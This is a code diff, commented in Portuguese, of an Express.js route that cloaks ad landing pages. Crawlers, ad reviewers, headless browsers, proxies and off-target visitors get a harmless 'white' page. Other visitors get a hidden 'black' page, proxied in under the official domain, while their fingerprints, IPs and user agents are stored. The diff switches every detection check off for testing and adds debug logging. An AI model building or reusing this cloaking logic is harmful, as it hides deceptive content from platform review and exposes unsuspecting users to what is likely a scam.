@@ -22,24 +22,26 @@ router.get('/:slug', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const { fp, token } = req.query;
 
-    const isBot = /(bot|crawl|spider|facebookexternalhit|facebot|googlebot|bingbot)/i.test(userAgent);
-    const fromAd = /(google|facebook|tiktok|kwai|bing|ads|utm)/i.test(ref);
-    const headless = isHeadless(userAgent);
-    const proxy = isProxyDetected(userAgent, ip);
-    const geoOk = await isGeoAllowed(ip);
-    const timeOk = isAccessTimeValid();
+    // ⚠️ Checagens desligadas pra teste
+    const fromAd = true;
+    const geoOk = true;
+    const timeOk = true;
+    const proxy = false;
+    const headless = false;
+    const isBot = false;
 
     const exists = await Fingerprint.findOne({ fp, ip, userAgent });
     const trusted = exists || (token === 'chave-compartilhamento-segura');
 
     const blocked = isBot || !fromAd || headless || proxy || !geoOk || !timeOk;
 
-    // Determina a URL a ser carregada via proxy
-    const targetUrl = (blocked && !trusted)
-      ? domain.baseUrl   // Carrega a página white dentro do .com
-      : domain.realUrl;  // Carrega a página black dentro do .com
+    // 🔍 Debug no console
+    console.log("🩻 Checagem visitante:", { isBot, fromAd, headless, proxy, geoOk, timeOk, trusted });
 
-    // Salva FP se for humano
+    const targetUrl = (blocked && !trusted)
+      ? domain.baseUrl
+      : domain.realUrl;
+
     if (!exists && fp && !blocked) {
       await Fingerprint.create({ fp, ip, userAgent, validado: true, dataValidado: new Date() });
     } else if (exists && !exists.validado && !blocked) {
@@ -48,7 +50,6 @@ router.get('/:slug', async (req, res) => {
       await exists.save();
     }
 
-    // Faz o proxy do conteúdo da página
     const response = await axios.get(targetUrl, {
       headers: {
         'User-Agent': userAgent,
@@ -57,7 +58,7 @@ router.get('/:slug', async (req, res) => {
       }
     });
 
-    res.send(response.data); // INJETA o HTML direto no domínio oficial
+    res.send(response.data);
 
   } catch (err) {
     console.error("❌ Erro em render.routes:", err.message);
